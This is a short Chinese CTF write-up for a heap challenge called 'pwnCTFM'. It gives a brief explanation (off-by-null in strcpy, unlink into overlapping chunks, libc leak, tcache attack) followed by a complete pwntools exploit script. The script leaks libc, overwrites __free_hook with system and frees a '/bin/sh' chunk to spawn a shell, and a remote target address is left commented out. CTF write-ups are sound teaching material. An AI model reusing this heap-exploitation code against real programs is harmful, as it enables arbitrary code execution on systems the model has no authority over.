# pwnCTFM

这个也是一个tcache的一个题目这里我们使用的方法是使用unlink转heapoverlaipping如何泄露libc最后使用tcache-attack

这个题目还有一个要注意的就是strcopy这个函数他一次只能溢出一个字符也就是offbynull

因此我们的exp

```python
from pwn import *

p = process("/home/fofa/attachments/pwn")
# p = remote("223.112.5.141", 55695)
elf = ELF("/home/fofa/attachments/pwn")
libc = ELF("/home/fofa/attachments/libc-2.27.so")
context.log_level = "debug"

# your choice>>
# list: 0x0000555555554000+0x203040

def add(name, size:int, des, score:int, finished=True):
    p.sendlineafter(b"your choice>>", b"1")
    p.sendafter(b"topic name:", name)
    p.sendlineafter(b"des size:", str(size).encode())
    p.sendafter(b"topic des:", des)
    if finished:
        p.sendlineafter(b"topic score:", str(score).encode())

def delete(idx:int):
    p.sendlineafter(b"your choice>>", b"2")
    p.sendlineafter(b"index:", str(idx).encode())

def show(idx:int):
    p.sendlineafter(b"your choice>>", b"3")
    p.sendlineafter(b"index:", str(idx).encode())

def exp():
    p.sendlineafter(b"input manager name:", b"CTFM")
    p.sendlineafter(b"input password:", b"123456")
    #gdb.attach(p, "b *0x0000555555554000+0xe08\nc\n")

    # build overlapping

    for i in range(7):
        add(b"AAAA", 0xf0, b"unsorted", 100) #0-6
    add(b"AAAA", 0xf0, b"unsorted", 100) #7
    add(b"AAAA", 0x68, b"vuln", 100) #8
    add(b"AAAA", 0xf0, b"unsorted", 100) #9
    for i in range(6):
        delete(i) #del 0-5
    delete(7)
    add(b"split", 0x10, b"split", 100) #0 split
    delete(6)

    ## offbynull
    delete(8)
    add(b"AAAA", 0x68, b"a"*0x68, 100) #1
    ## make up prev_size
    # gdb.attach(p)
    for i in range(8):
        delete(1)
        add(b"AAAA", 0x68, b"a"*(0x68-i), 100) #1
    gdb.attach(p)
    delete(1)
    add(b"AAAA", 0x68, b"a"*0x60+p64(0x270), 100) #1
    delete(9) #delete 9 unlink
    # gdb.attach(p)

    # leak libc
    add(b"show", 0xf0, b"show", 100) #2
    add(b"BBBB", 0xd0, b"BBBB", 100) #3
    add(b"BBBB", 0x10, b"BBBB", 100) #4
    gdb.attach(p)
    show(2)
    p.recvuntil(b"topic des:")
    libc_leak = u64(p.recv(6).ljust(8, b"\x00"))

    # info("libc_leak"+hex(libc_leak))
    libc_base = libc_leak - 96 - 0x10 - libc.symbols[b"__malloc_hook"]
    free_hook = libc_base + libc.symbols[b"__free_hook"]
    system = libc_base + libc.symbols[b"system"]
    print("libc_leak:", hex(libc_leak))
    print("libc_base:", hex(libc_base))
    # gdb.attach(p)
    # tcache attck
    add(b"tmp", 0x68, b"tmp", 100) #5
    delete(5)
    delete(1)
    add(b"BBBB", 0x80, b"BBBB", 100) #1
    add(b"BBBB", 0x160, p64(free_hook), 100) #5这里主要的原因就是我们要申请一个0x160大小的堆块他就会去

    # rewrite freehook
    add(b"CCCC", 0x68, b"/bin/sh\x00", 100) #6
    add(b"CCCC", 0x68, p64(system), 100) #7
    print("free_hook:", hex(free_hook))
    delete(6)

    #gdb.attach(p)
    p.interactive()

if __name__ == "__main__":
    exp()

```

